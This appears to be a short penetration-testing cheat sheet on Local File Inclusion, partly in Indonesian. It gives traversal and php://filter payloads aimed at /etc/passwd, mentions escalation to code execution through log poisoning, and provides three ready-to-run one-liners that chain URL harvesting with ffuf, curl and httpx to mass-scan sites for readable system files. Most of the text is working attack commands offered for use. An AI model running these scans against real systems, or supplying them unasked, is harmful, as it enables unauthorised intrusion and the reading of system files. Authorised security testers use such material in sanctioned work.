# Local File Inclusion (LFI) Testing

### Tips :&#x20;

1. Test payloads: **`../../../../etc/passwd`**, encoded, null-byte (legacy), wrapper **`?file=php://filter/convert.base64-encode/resource=/etc/passwd`**
2. Kombinasi LFI â†’ RCE via log poisoning, upload log injection, or predictable include paths

***

### LFI Discovery

#### Basic

```sh
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
```

#### with Curl

```sh
gau example.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

#### HTTPX LFI Test

```sh
echo 'https://example.com/index.php?page=' | httpx -paths /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
```
